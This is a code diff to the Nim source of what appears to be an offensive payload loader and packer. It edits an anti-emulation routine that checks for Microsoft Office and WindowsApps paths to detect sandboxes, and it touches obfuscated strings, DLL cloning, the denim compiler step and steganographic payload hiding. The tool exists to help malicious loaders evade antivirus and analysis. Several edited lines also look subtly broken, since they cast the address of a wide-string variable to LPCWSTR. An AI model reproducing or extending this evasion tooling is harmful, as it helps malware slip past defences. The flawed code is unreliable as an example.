@@ -35,7 +35,7 @@ import Csharp
 import AntiDebug
 
 
-from system import io
+#from system import io
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
@@ -2667,6 +2667,7 @@ let AntiEmulateStub * = """
 #from os import fileExists
 #from winim import GetFileAttributesA
 
+
 proc GetFileAttributesW(path: LPCWSTR): DWORD {.importc, dynlib: "kernel32.dll".}
 
 proc officeFileCheck(): void =
@@ -2674,7 +2675,8 @@ proc officeFileCheck(): void =
     var fileCount: int = 0
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
-    dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(AppXManifest)))
+    let wideAppXManifest = newWideCString(AppXManifest)
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideAppXManifest))
     if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
@@ -2685,7 +2687,8 @@ proc officeFileCheck(): void =
     else:
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
-        dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(RappelZapp)))
+        let wideRappelZapp = newWideCString(RappelZapp)
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideRappelZapp))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2697,8 +2700,9 @@ proc officeFileCheck(): void =
     # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
     var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
     var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
-
-    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps))) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps2)))):
+    let wideWindowsApps = newWideCString(WindowsApps)
+    let wideWindowsApps2 = newWideCString(WindowsApps2)
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps2))):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
@@ -4573,9 +4577,11 @@ when system.hostOS == "windows":
         if (exist):
             # An additional whitespace at the end causes an compiler error here, so we'll remove it
             basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
-            stub = stub.replace("import nimstrenc", "")
+            stub = stub.replace("        import nimstrenc", "")
+            stub = stub.replace("    import nimstrenc", "")
             stub = stub.replace("when not defined(proxy):", "")
             stub = stub.replace("when defined(notcloned):", "")
+            stub = stub.replace("    when defined(notcloned):", "")
             writeFile("Loader.nim", stub)
 
             echo "Denim compile argument: \r\n"
@@ -4589,7 +4595,7 @@ when system.hostOS == "windows":
             except:
                 exists = false
             if(exists):
-                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FilaName is ignored by denim)"
+                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FileName is ignored by denim)"
                 echo "\n" & msg
                 if(replace):
                     var randstring: string = rndStr(2)
@@ -4761,11 +4767,13 @@ if(dll_out):
             discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
 
 
-var exists: bool = true
-try:
-    var fileCheck = readFile(fmt"{outfile}")
-except:
-    exists = false
+var exists: bool = false
+if not(denim):
+    try:
+        var fileCheck = readFile(fmt"{outfile}")
+        exists = true
+    except:
+        exists = false
 
 if(exists):
     let msg = fmt"[!] Loader saved to {outfile}"
@@ -4883,7 +4891,8 @@ if(exists):
 
 
 else:
-    echo "\r\nCompilation failed!! Check the error message.\r\n"
+    if not(denim):
+        echo "\r\nCompilation failed!! Check the error message.\r\n"
 
 if(useStego):
     echo "\r\n[*] The payload is saved in the image: " & stegofile & "\r\n"
